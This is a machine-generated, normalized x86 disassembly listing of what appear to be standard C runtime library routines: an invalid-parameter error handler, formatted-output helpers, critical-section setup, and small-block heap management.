test eax eax
je r-xdata
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_200463e
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x328 ] 0x0
push ebx
push 0x4c
lea eax [ ebp - 0x324 ]
push 0x0
push eax
call sub_2007940
lea eax [ ebp - 0x328 ]
mov [ ebp - 0x2d8 ] eax
lea eax [ ebp - 0x2d0 ]
add esp 0xc
mov [ ebp - 0x2d4 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
lea ecx [ ebp + 0x4 ]
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x20c ] ecx
mov ecx [ ecx - 0x4 ]
mov [ ebp - 0x21c ] ecx
mov [ ebp - 0x328 ] 0xc0000417
mov [ ebp - 0x324 ] 0x1
mov [ ebp - 0x31c ] eax
call [ IsDebuggerPresent@IAT ]
push 0x0
mov ebx eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x2d8 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
push 0xc0000417
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop ebx
call sub_2002d91
leave
retn
test ebx ebx
jne r-xdata
push 0x2
call sub_200bad0
pop ecx
sub_2004766
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call sub_2003ff8
pop ecx
test eax eax
je r-xdata
push 0x2
call sub_200bad0
pop ecx
pop ebp
jmp sub_200463e
pop ebp
jmp eax
sub_200478c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ecx * 8 + rw-data ]
pop ebp
retn
inc ecx
cmp ecx 0x2d
jb r-xdata
cmp eax [ ecx * 8 + rw-data ]
je r-xdata
lea ecx [ eax - 0x13 ]
cmp ecx 0x11
ja r-xdata
add eax 0xffffff44
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_20047f4
mov edi edi
push ebp
mov ebp esp
push esi
call sub_20047e1
mov ecx [ ebp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_200478c
pop ecx
mov esi eax
call sub_20047ce
mov [ eax ] esi
pop esi
pop ebp
retn
sub_2004817
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_200788d
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_20047ce
mov [ eax ] 0x9
push ebx
xor ebx ebx
test al 0x1
je r-xdata
call sub_20047ce
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
or eax 0x2
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x4 ] ebx
test eax 0x10c
jne r-xdata
mov [ esi + 0x4 ] ebx
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_2006998
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
or eax 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
xor edi edi
inc edi
push edi
lea eax [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
call sub_20080ed
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
dec ecx
cmp edi ebx
mov [ esi + 0x4 ] ecx
jle r-xdata
push [ ebp + 0xc ]
call sub_200bcbf
pop ecx
test eax eax
jne r-xdata
call sub_2006998
add eax 0x40
cmp esi eax
jne r-xdata
pop ebx
mov eax [ ebp + 0x8 ]
and eax 0xff
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_20080ed
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_200bc76
pop ecx
pop edi
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push ebx
push ebx
push ecx
call sub_200bb5d
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_200497b
test [ ecx + 0xc ] 0x40
je r-xdata
dec [ ecx + 0x4 ]
js r-xdata
cmp [ ecx + 0x8 ] 0x0
je r-xdata
movsx eax al
push ecx
push eax
call sub_2004817
pop ecx
pop ecx
mov edx [ ecx ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ esi ]
retn
or [ esi ] eax
retn
cmp eax 0xffffffff
jne r-xdata
sub_20049ae
mov edi edi
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ebp + 0x8 ]
dec [ ebp + 0xc ]
call sub_200497b
cmp [ esi ] 0xffffffff
je r-xdata
pop esi
pop ebp
retn
sub_20049d4
mov edi edi
push ebp
mov ebp esp
test [ edi + 0xc ] 0x40
push ebx
push esi
mov esi eax
mov ebx ecx
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jg r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov al [ ebx ]
dec [ ebp + 0x8 ]
mov ecx edi
call sub_200497b
inc ebx
cmp [ esi ] 0xffffffff
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
add [ esi ] eax
jmp r-xdata
call sub_20047ce
cmp [ eax ] 0x2a
jne r-xdata
mov ecx edi
mov al 0x3f
call sub_200497b
sub_2004a21
mov edi edi
push ebp
mov ebp esp
sub esp 0x278
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x25c ]
mov [ ebp - 0x24c ] esi
mov [ ebp - 0x224 ] edi
mov [ ebp - 0x248 ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x230 ] eax
mov [ ebp - 0x240 ] eax
mov [ ebp - 0x238 ] eax
call sub_200144c
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_20047ce
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_2004766
add esp 0x14
cmp [ ebp - 0x250 ] 0x0
je r-xdata
xor ecx ecx
cmp ebx ecx
je r-xdata
push esi
call sub_200788d
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ ebx ]
mov [ ebp - 0x228 ] ecx
mov [ ebp - 0x220 ] ecx
mov [ ebp - 0x244 ] ecx
mov [ ebp - 0x211 ] dl
test dl dl
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_2002d91
leave
retn
cmp [ ebp - 0x250 ] 0x0
je r-xdata
inc ebx
cmp [ ebp - 0x228 ] 0x0
mov [ ebp - 0x23c ] ebx
jl r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov esi eax
sar esi 0x5
shl ecx 0x6
add ecx [ esi * 4 + rw-data ]
jmp r-xdata
mov eax [ ebp - 0x228 ]
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
mov al dl
sub al 0x20
cmp al 0x58
ja r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
xor esi esi
xor eax eax
movsx eax dl
movsx eax [ eax + r--data ]
and eax 0xf
xor esi esi
jmp r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov ebx [ ebp - 0x23c ]
mov al [ ebx ]
mov [ ebp - 0x211 ] al
test al al
je r-xdata
jmp [ eax * 4 + r-xdata ]
movsx eax [ ecx + eax * 8 + r--data ]
push 0x7
sar eax 0x4
pop ecx
mov [ ebp - 0x26c ] eax
cmp eax ecx
ja r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
mov ecx [ ebp - 0x26c ]
mov edi [ ebp - 0x224 ]
mov dl al
jmp r-xdata
sub_20055b9
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] eax
push 0x0
sete al
push 0x1000
push eax
call [ HeapCreate@IAT ]
mov [ rw-data ] eax
test eax eax
jne r-xdata
xor eax eax
inc eax
mov [ rw-data ] eax
pop ebp
retn
pop ebp
retn
sub_20055e9
mov edi edi
push esi
push edi
xor esi esi
mov edi rw-data
inc esi
cmp esi 0x24
jl r-xdata
lea eax [ esi * 8 + rw-data ]
mov [ eax ] edi
push 0xfa0
push [ eax ]
add edi 0x18
call sub_200aff6
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ esi * 8 + rw-data ] 0x1
jne r-xdata
xor eax eax
inc eax
and [ esi * 8 + rw-data ] 0x0
xor eax eax
jmp r-xdata
pop edi
pop esi
retn
sub_2005634
mov edi edi
push ebx
mov ebx [ DeleteCriticalSection@IAT ]
push esi
mov esi rw-data
push edi
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov esi rw-data
pop edi
push edi
call ebx
push edi
call sub_20016b0
and [ esi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call ebx
sub_20056a2
push 0xc
push r--data
call sub_200625c
xor edi edi
inc edi
mov [ ebp - 0x1c ] edi
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
lea esi [ esi * 8 + rw-data ]
cmp [ esi ] ebx
je r-xdata
call sub_20065f7
push 0x1e
call sub_200644c
push 0xff
call sub_2002ee9
push 0x18
call sub_200b534
pop ecx
mov edi eax
cmp edi ebx
jne r-xdata
mov eax edi
jmp r-xdata
push 0xa
call sub_2005765
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi ] ebx
jne r-xdata
call sub_20047ce
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_20062a1
retn
push edi
call sub_20016b0
pop ecx
push 0xfa0
push edi
call sub_200aff6
pop ecx
pop ecx
test eax eax
jne r-xdata
mov [ esi ] edi
jmp r-xdata
push edi
call sub_20016b0
pop ecx
call sub_20047ce
mov [ eax ] 0xc
mov [ ebp - 0x1c ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_200575c
mov eax [ ebp - 0x1c ]
sub_2005765
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax * 8 + rw-data ]
cmp [ esi ] 0x0
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push eax
call sub_20056a2
pop ecx
test eax eax
jne r-xdata
push 0x11
call sub_2002e95
pop ecx
sub_2005798
mov edi edi
push ebp
mov ebp esp
mov ecx [ rw-data ]
mov eax [ rw-data ]
imul ecx ecx 0x14
add ecx eax
jmp r-xdata
cmp eax ecx
jb r-xdata
mov edx [ ebp + 0x8 ]
sub edx [ eax + 0xc ]
cmp edx 0x100000
jb r-xdata
xor eax eax
pop ebp
retn
add eax 0x14
sub_20057c8
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi esi
sub edi [ ecx + 0xc ]
add esi 0xfffffffc
shr edi 0xf
mov ecx edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ esi ]
dec ecx
mov [ ebp - 0x4 ] ecx
test cl 0x1
jne r-xdata
pop edi
pop esi
leave
retn
push ebx
lea ebx [ ecx + esi ]
mov edx [ ebx ]
mov [ ebp - 0xc ] edx
mov edx [ esi - 0x4 ]
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0xc ]
mov [ ebp + 0xc ] ebx
test dl 0x1
jne r-xdata
mov edx ecx
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
mov ebx [ ebp - 0x8 ]
and ebx 0x1
mov [ ebp - 0xc ] ebx
jne r-xdata
push 0x3f
pop edx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
push 0x3f
pop edx
mov ebx [ ebp + 0x8 ]
sub esi [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
sar ebx 0x4
push 0x3f
mov [ ebp + 0xc ] esi
dec ebx
pop esi
cmp ebx esi
jbe r-xdata
mov edx [ ebx + 0x8 ]
mov ebx [ ebx + 0x4 ]
mov ecx [ ebp - 0x4 ]
add ecx [ ebp - 0xc ]
mov [ edx + 0x4 ] ebx
mov edx [ ebp + 0xc ]
mov ebx [ edx + 0x4 ]
mov edx [ edx + 0x8 ]
mov [ ebx + 0x8 ] edx
mov [ ebp - 0x4 ] ecx
mov ebx 0x80000000
cmp edx 0x20
jae r-xdata
mov ecx [ ebp - 0x10 ]
lea ecx [ ecx + edx * 8 ]
mov ebx [ ecx + 0x4 ]
mov [ esi + 0x8 ] ecx
mov [ esi + 0x4 ] ebx
mov [ ecx + 0x4 ] esi
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov ecx [ esi + 0x4 ]
cmp ecx [ esi + 0x8 ]
jne r-xdata
cmp ebx edx
je r-xdata
add ecx [ ebp - 0x8 ]
mov edx ecx
sar edx 0x4
dec edx
mov [ ebp - 0x4 ] ecx
cmp edx esi
jbe r-xdata
mov ebx esi
lea ecx [ edx - 0x20 ]
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ecx edx
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
mov [ eax + esi - 0x4 ] eax
mov eax [ ebp - 0x10 ]
dec [ eax ]
jne r-xdata
mov cl [ edx + eax + 0x4 ]
mov [ ebp + 0xf ] cl
inc cl
mov [ edx + eax + 0x4 ] cl
cmp edx 0x20
jae r-xdata
cmp ebx edx
je r-xdata
mov edx esi
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
pop ebx
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov esi [ ebp + 0xc ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
cmp esi [ ecx + 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] edi
mov ecx [ rw-data ]
mov esi [ VirtualFree@IAT ]
push 0x4000
shl ecx 0xf
add ecx [ eax + 0xc ]
mov ebx 0x8000
push ebx
push ecx
call esi
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov edx 0x80000000
shr edx cl
or [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
mov ecx [ rw-data ]
and [ eax + ecx * 4 + 0xc4 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
dec [ eax + 0x43 ]
mov eax [ rw-data ]
mov ecx [ eax + 0x10 ]
cmp [ ecx + 0x43 ] 0x0
jne r-xdata
lea ecx [ edx - 0x20 ]
mov edx 0x80000000
shr edx cl
lea eax [ eax + edi * 4 + 0xc4 ]
or [ eax ] edx
lea ecx [ edx - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
mov ebx 0x80000000
mov ecx edx
shr ebx cl
lea eax [ eax + edi * 4 + 0x44 ]
or [ eax ] ebx
jmp r-xdata
mov ecx edx
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov [ esi + 0x8 ] ecx
mov esi 0x80000000
cmp ebx 0x20
jae r-xdata
cmp [ eax + 0x8 ] 0xffffffff
jne r-xdata
and [ eax + 0x4 ] 0xfffffffe
mov eax [ rw-data ]
lea ecx [ ebx - 0x20 ]
shr esi cl
not esi
and [ eax + edi * 4 + 0xc4 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
mov ecx ebx
shr esi cl
not esi
and [ eax + edi * 4 + 0x44 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
push ebx
push 0x0
push [ eax + 0xc ]
call esi
mov eax [ rw-data ]
push [ eax + 0x10 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
mov ecx [ rw-data ]
mov eax [ rw-data ]
imul ecx ecx 0x14
mov edx [ rw-data ]
sub ecx eax
lea ecx [ ecx + edx - 0x14 ]
push ecx
lea ecx [ eax + 0x14 ]
push ecx
push eax
call sub_200bf50
mov eax [ ebp + 0x8 ]
add esp 0xc
dec [ rw-data ]
cmp eax [ rw-data ]
jbe r-xdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
and [ ecx ] esi
jmp r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
sub [ ebp + 0x8 ] 0x14
sub_2005ade
mov eax [ rw-data ]
push esi
mov esi [ rw-data ]
push edi
xor edi edi
cmp esi eax
jne r-xdata
imul esi esi 0x14
add esi [ rw-data ]
push 0x41c4
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ esi + 0x10 ] eax
cmp eax edi
je r-xdata
add eax 0x10
imul eax eax 0x14
push eax
push [ rw-data ]
push edi
push [ rw-data ]
call [ HeapReAlloc@IAT ]
cmp eax edi
jne r-xdata
xor eax eax
jmp r-xdata
push 0x4
push 0x2000
push 0x100000
push edi
call [ VirtualAlloc@IAT ]
mov [ esi + 0xc ] eax
cmp eax edi
jne r-xdata
add [ rw-data ] 0x10
mov esi [ rw-data ]
mov [ rw-data ] eax
pop edi
pop esi
retn
or [ esi + 0x8 ] 0xffffffff
mov [ esi ] edi
mov [ esi + 0x4 ] edi
inc [ rw-data ]
mov eax [ esi + 0x10 ]
or [ eax ] 0xffffffff
mov eax esi
push [ esi + 0x10 ]
push edi
push [ rw-data ]
call [ HeapFree@IAT ]
jmp r-xdata
sub_2005b8e
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x8 ]
push ebx
push esi
mov esi [ ecx + 0x10 ]
push edi
xor ebx ebx
jmp r-xdata
test eax eax
jge r-xdata
add eax eax
inc ebx
mov eax ebx
imul eax eax 0x204
lea eax [ eax + esi + 0x144 ]
push 0x3f
mov [ ebp - 0x8 ] eax
pop edx
mov [ eax + 0x8 ] eax
mov [ eax + 0x4 ] eax
add eax 0x8
dec edx
jne r-xdata
push 0x4
mov edi ebx
push 0x1000
shl edi 0xf
add edi [ ecx + 0xc ]
push 0x8000
push edi
call [ VirtualAlloc@IAT ]
test eax eax
jne r-xdata
lea edx [ edi + 0x7000 ]
mov [ ebp - 0x4 ] edx
cmp edi edx
ja r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x1f8
lea ecx [ edi + 0xc ]
mov [ eax + 0x4 ] ecx
mov [ ecx + 0x8 ] eax
lea ecx [ edx + 0xc ]
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
and [ esi + ebx * 4 + 0x44 ] 0x0
xor edi edi
inc edi
mov [ esi + ebx * 4 + 0xc4 ] edi
mov al [ esi + 0x43 ]
mov cl al
inc cl
test al al
mov eax [ ebp + 0x8 ]
mov [ esi + 0x43 ] cl
jne r-xdata
mov ecx edx
sub ecx edi
shr ecx 0xc
lea eax [ edi + 0x10 ]
inc ecx
pop edi
pop esi
pop ebx
leave
retn
mov edx 0x80000000
mov ecx ebx
shr edx cl
not edx
and [ eax + 0x8 ] edx
mov eax ebx
or [ eax + 0x4 ] edi
or [ eax - 0x8 ] 0xffffffff
or [ eax + 0xfec ] 0xffffffff
lea edx [ eax + 0xffc ]
mov [ eax ] edx
lea edx [ eax - 0x1004 ]
mov [ eax - 0x4 ] 0xff0
mov [ eax + 0x4 ] edx
mov [ eax + 0xfe8 ] 0xff0
add eax 0x1000
dec ecx
jne r-xdata
mov edx [ ebp - 0x4 ]
sub_2005c96
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
mov edx edi
sub edx [ ecx + 0xc ]
add esi 0x17
shr edx 0xf
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ edi - 0x4 ]
and esi 0xfffffff0
dec ecx
cmp esi ecx
lea edi [ ecx + edi - 0x4 ]
mov ebx [ edi ]
mov [ ebp + 0x10 ] ecx
mov [ ebp - 0x4 ] ebx
jle r-xdata
jge r-xdata
test bl 0x1
jne r-xdata
xor eax eax
inc eax
mov ebx [ ebp + 0xc ]
sub [ ebp + 0x10 ] esi
lea ecx [ esi + 0x1 ]
mov [ ebx - 0x4 ] ecx
lea ebx [ ebx + esi - 0x4 ]
mov esi [ ebp + 0x10 ]
sar esi 0x4
dec esi
mov [ ebp + 0xc ] ebx
mov [ ebx - 0x4 ] ecx
cmp esi 0x3f
jbe r-xdata
xor eax eax
jmp r-xdata
add ebx ecx
cmp esi ebx
jg r-xdata
test [ ebp - 0x4 ] 0x1
jne r-xdata
push 0x3f
pop esi
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x4 ]
sar ecx 0x4
dec ecx
mov [ ebp - 0x8 ] ecx
cmp ecx 0x3f
jbe r-xdata
mov ecx [ ebp - 0xc ]
lea ecx [ ecx + esi * 8 ]
mov edi [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] edi
mov [ ecx + 0x4 ] ebx
mov ecx [ ebx + 0x4 ]
mov [ ecx + 0x8 ] ebx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
mov esi [ ebp - 0x4 ]
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx [ edi + 0x4 ]
cmp ebx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop ecx
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x10 ]
mov [ ebx ] eax
mov [ eax + ebx - 0x4 ] eax
mov cl [ esi + eax + 0x4 ]
mov [ ebp + 0xf ] cl
inc cl
mov [ esi + eax + 0x4 ] cl
cmp esi 0x20
jae r-xdata
mov ecx [ edi + 0x4 ]
cmp ecx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop esi
mov ecx [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ecx [ edi + 0x4 ]
mov edi [ edi + 0x8 ]
mov [ ecx + 0x8 ] edi
mov ecx [ ebp + 0x10 ]
sub ecx esi
add [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov ebx 0x80000000
cmp ecx 0x20
jae r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov ecx [ edi + 0x8 ]
mov esi [ edi + 0x4 ]
mov [ ecx + 0x4 ] esi
mov esi [ edi + 0x8 ]
mov ecx [ edi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov esi [ ebp + 0x10 ]
add esi [ ebp - 0x4 ]
mov [ ebp + 0x10 ] esi
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx 0x80000000
cmp esi 0x20
jae r-xdata
mov edx [ ebp + 0xc ]
mov edi [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
sar edi 0x4
dec edi
lea ecx [ ecx + esi - 0x4 ]
cmp edi 0x3f
jbe r-xdata
add ecx 0xffffffe0
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] edi
lea eax [ eax + edx * 4 + 0x44 ]
mov ecx esi
jmp r-xdata
mov ecx esi
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] edi
push 0x3f
pop esi
lea ecx [ esi - 0x20 ]
shr ebx cl
lea ecx [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ecx esi
shr ebx cl
lea esi [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ esi ]
jne r-xdata
mov ebx [ ebp - 0xc ]
lea ebx [ ebx + edi * 8 ]
mov [ ebp + 0x10 ] ebx
mov ebx [ ebx + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ebx [ ebp + 0x10 ]
mov [ ecx + 0x8 ] ebx
mov [ ebx + 0x4 ] ecx
mov ebx [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov ebx [ ecx + 0x4 ]
cmp ebx [ ecx + 0x8 ]
jne r-xdata
push 0x3f
pop edi
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx 0x80000000
shr edx cl
or [ eax ] edx
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
lea eax [ edx + esi - 0x4 ]
mov [ eax ] ecx
mov [ ecx + eax - 0x4 ] ecx
jmp r-xdata
mov cl [ edi + eax + 0x4 ]
mov [ ebp + 0x13 ] cl
inc cl
mov [ edi + eax + 0x4 ] cl
cmp edi 0x20
jae r-xdata
lea eax [ esi + 0x1 ]
mov [ edx - 0x4 ] eax
mov [ edx + esi - 0x8 ] eax
jmp r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ edi - 0x20 ]
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
lea eax [ eax + edx * 4 + 0x44 ]
mov ecx edi
jmp r-xdata
mov ecx edi
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
mov edx 0x80000000
shr edx cl
